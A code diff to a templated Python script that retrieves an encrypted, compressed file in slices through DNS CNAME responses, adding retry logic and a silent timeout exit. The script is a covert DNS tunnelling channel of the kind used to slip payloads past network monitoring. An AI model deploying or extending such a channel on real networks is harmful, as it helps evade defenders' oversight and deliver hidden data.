@@ -10,6 +10,7 @@ import random
 import socket
 import struct
 import sys
+import time
 import zlib
 
 DOMAIN_LABELS = @@DOMAIN_LABELS@@
@@ -289,15 +290,24 @@ addr = (host, port)
 pk = _ub(psk)
 ek = _enc_key(pk)
 mk = _mac_key(pk)
+_deadline = time.time() + 60
 slices = {}
 for si in range(TOTAL_SLICES):
-    qname = (_derive_slice_token(si), FILE_TAG) + tuple(DOMAIN_LABELS)
-    qid = random.randint(0, 0xFFFF)
-    pkt = _build_query(qid, qname)
-    resp = _send_query(addr, pkt)
-    cname = _parse_cname(resp, qid, qname)
-    payload = _extract_payload(cname)
-    slices[si] = _process_slice(ek, mk, si, payload)
+    while True:
+        if time.time() > _deadline:
+            sys.exit(1)
+        try:
+            qname = (_derive_slice_token(si), FILE_TAG) + tuple(DOMAIN_LABELS)
+            qid = random.randint(0, 0xFFFF)
+            pkt = _build_query(qid, qname)
+            resp = _send_query(addr, pkt)
+            cname = _parse_cname(resp, qid, qname)
+            payload = _extract_payload(cname)
+            slices[si] = _process_slice(ek, mk, si, payload)
+            _deadline = time.time() + 60
+            break
+        except Exception:
+            time.sleep(1)
 compressed = b"".join(slices[i] for i in range(TOTAL_SLICES))
 if len(compressed) != COMPRESSED_SIZE:
     raise ValueError("sz", len(compressed), COMPRESSED_SIZE)
